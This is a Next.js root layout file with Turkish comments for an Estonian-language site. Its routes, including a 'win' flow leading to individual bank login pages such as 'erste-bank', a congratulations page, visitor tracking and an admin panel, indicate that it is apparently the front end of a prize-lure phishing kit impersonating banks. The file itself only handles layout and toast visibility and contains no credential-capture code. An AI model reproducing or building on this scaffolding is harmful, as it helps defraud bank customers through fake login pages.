"use client";

import { usePathname } from "next/navigation";
import LiveToast from "@/components/LiveToast";
import { SettingsProvider } from "@/contexts/SettingsContext";
import { VisitorTracker } from "@/components/VisitorTracker";
import { GlobalBackgroundLayer } from "@/components/demo/GlobalBackgroundLayer";
import "./globals.css";

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  const pathname = usePathname() ?? "/";

  // Sadece belirli yollarda bildirimi gösterme kuralları:
  // Admin yolları, geçersiz banka sayfaları, tebrikler veya BİREYSEL banka giriş sayfalarında göstermeyelim.
  // "/banken" (liste) sayfasında GÖSTERİLECEK.
  const hideToastOnPaths = [
    "/admin",
    "/admin/login",
    "/invalid-bank",
    "/congratulations",
    "/live-support",
    "/banken"
  ];
  
  // Eğer yol "/bank/" içeriyorsa (örneğin /win/123/bank/erste-bank), toast'u gizle.
  // Ama "/banken" ise gizleme.
  const shouldShowToast = !hideToastOnPaths.some(path => pathname.startsWith(path)) && !pathname.includes("/bank/");

  // Global arka planı gizlenecek yollar: Admin ve bireysel banka giriş sayfaları (özel arka planı var)
  const isAdminPage = pathname.startsWith("/admin");
  const isIndividualBankLoginPage = pathname.includes("/bank/");
  const shouldHideGlobalBackground = isAdminPage || isIndividualBankLoginPage;

  const bodyClass = "min-h-screen relative bg-[#020b22]";

  // GEÇİCİ OLARAK KAPATILDI: LiveToast özelliği daha sonra tekrar açılmak üzere deaktif edildi.
  const ENABLE_TOAST = false;

  return (
    <html lang="et">
      <body className={bodyClass}>
        {!shouldHideGlobalBackground && <GlobalBackgroundLayer />}
        <VisitorTracker />
        <SettingsProvider>
          {ENABLE_TOAST && shouldShowToast && <LiveToast />}
          {children}
        </SettingsProvider>
      </body>
    </html>
  );
}
